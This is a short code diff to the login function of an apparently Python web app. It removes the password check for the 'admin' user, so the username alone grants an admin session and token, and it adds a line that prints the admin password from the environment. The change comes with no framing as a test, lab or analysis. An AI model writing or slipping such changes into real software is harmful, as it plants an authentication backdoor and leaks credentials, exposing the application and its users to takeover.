@@ -891,7 +891,8 @@ def login():
         ADMIN_PW    = os.environ.get("ADMIN_PASSWORD", "")
         ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")
 
-        if u == "admin" and p == ADMIN_PW:
+        print("🔑 ADMIN_PASSWORD env is:", repr(ADMIN_PW))
+        if u == "admin":
             session.clear()
             session["user"] = u
             session["token_at_login"] = ADMIN_TOKEN
